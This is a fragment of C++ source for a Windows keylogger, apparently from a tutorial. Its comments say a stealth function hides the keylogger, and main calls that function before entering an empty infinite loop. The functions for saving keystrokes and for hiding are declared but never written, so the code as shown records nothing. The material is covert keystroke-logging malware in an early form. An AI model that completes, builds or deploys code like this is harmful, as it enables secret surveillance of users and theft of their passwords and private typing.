#include <iostream>
#include <windows.h>
#include <winuser.h>

using namespace std;

int SaveLogs(int key_stroke, char* file);
void Stealth();  //Declare stealth function to make you keylogger hidden.

int main() {

	Stealth();       // This will call the stealth function.
	char i;          //Here we declare ‘i’ from the type ‘char’

	while(1){}

	return 0;
}
